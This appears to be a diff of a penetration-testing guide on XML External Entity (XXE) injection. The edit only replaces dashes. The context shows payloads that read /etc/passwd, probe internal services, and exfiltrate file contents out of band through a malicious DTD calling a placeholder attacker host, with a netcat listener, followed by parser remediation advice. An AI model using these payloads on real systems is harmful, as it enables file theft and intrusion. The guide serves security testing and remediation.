@@ -1,10 +1,10 @@
-# XXE — XML External Entity Injection
+# XXE - XML External Entity Injection
 
 ---
 
 ## What It Is
 
-When an application parses XML and the XML parser has **external entities enabled**, you can define an entity that references a file or URL — and the server includes its content in the response.
+When an application parses XML and the XML parser has **external entities enabled**, you can define an entity that references a file or URL - and the server includes its content in the response.
 
 Result: arbitrary file read on the server, or SSRF via the XML parser.
 
@@ -31,7 +31,7 @@ Replace the XML body with:
 <root><data>&xxe;</data></root>
 ```
 
-Send this as the request body — if the response includes `/etc/passwd` content → XXE confirmed.
+Send this as the request body - if the response includes `/etc/passwd` content -> XXE confirmed.
 
 **Windows targets:**
 ```xml
@@ -64,7 +64,7 @@ Instead of file://, use http://:
 <root><data>&xxe;</data></root>
 ```
 
-Use this to probe internal services — same targets as [SSRF](ssrf.md).
+Use this to probe internal services - same targets as [SSRF](ssrf.md).
 
 ---
 
@@ -72,16 +72,16 @@ Use this to probe internal services — same targets as [SSRF](ssrf.md).
 
 When the file content doesn't appear in the response, use out-of-band exfiltration.
 
-**Step 1 — Host a malicious DTD on your machine:**
+**Step 1 - Host a malicious DTD on your machine:**
 ```xml
-<!-- evil.dtd — serve this from your HTTP server -->
+<!-- evil.dtd - serve this from your HTTP server -->
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<your-ip>/?data=%file;'>">
 %eval;
 %exfil;
 ```
 
-**Step 2 — Reference your DTD in the XML:**
+**Step 2 - Reference your DTD in the XML:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -91,7 +91,7 @@ When the file content doesn't appear in the response, use out-of-band exfiltrati
 <root><data>test</data></root>
 ```
 
-**Step 3 — Watch your HTTP server** for the incoming request with the file content in the URL parameter.
+**Step 3 - Watch your HTTP server** for the incoming request with the file content in the URL parameter.
 
 ```sh
 python3 -m http.server 80
@@ -133,17 +133,17 @@ Catch it on:
 nc -lvnp 80
 ```
 
-If you get a connection → parser is vulnerable.
+If you get a connection -> parser is vulnerable.
 
 ---
 
 ## Remediation
 
-**Root cause:** The XML parser has external entity processing enabled. This is a parser configuration issue — the application doesn't need external entities but the parser allows them by default in many languages/libraries.
+**Root cause:** The XML parser has external entity processing enabled. This is a parser configuration issue - the application doesn't need external entities but the parser allows them by default in many languages/libraries.
 
 | Finding | Remediation |
 |---|---|
-| XXE in XML input | **Disable external entity processing in the XML parser.** This is a one-line config change in most languages — it's the correct and complete fix. |
+| XXE in XML input | **Disable external entity processing in the XML parser.** This is a one-line config change in most languages - it's the correct and complete fix. |
 | PHP (libxml) | `libxml_disable_entity_loader(true)` (PHP < 8.0) or use `LIBXML_NONET` flag: `simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET)` |
 | Java (SAXParser, DocumentBuilder) | `factory.setFeature("http://xml.org/sax/features/external-general-entities", false)` and `factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)` |
 | Python (lxml) | Use `resolve_entities=False`: `etree.parse(source, etree.XMLParser(resolve_entities=False))` |
@@ -151,4 +151,4 @@ If you get a connection → parser is vulnerable.
 | SVG upload with embedded XXE | Treat SVG as a code format, not an image. Process SVGs through a sanitizer (e.g., DOMPurify for SVG). Or reject SVG entirely if not needed. Re-encode images using Pillow/ImageMagick (strips XML content). |
 | XLSX/DOCX processing | Use library-level safe parsing modes. Don't extract and re-parse the internal XML manually. |
 
-**Key point for reports:** XXE is a parser misconfiguration, not an application logic bug. The fix is always in the XML parser configuration — it doesn't require rewriting application logic. This makes it a quick win for developers to fix once identified.
+**Key point for reports:** XXE is a parser misconfiguration, not an application logic bug. The fix is always in the XML parser configuration - it doesn't require rewriting application logic. This makes it a quick win for developers to fix once identified.
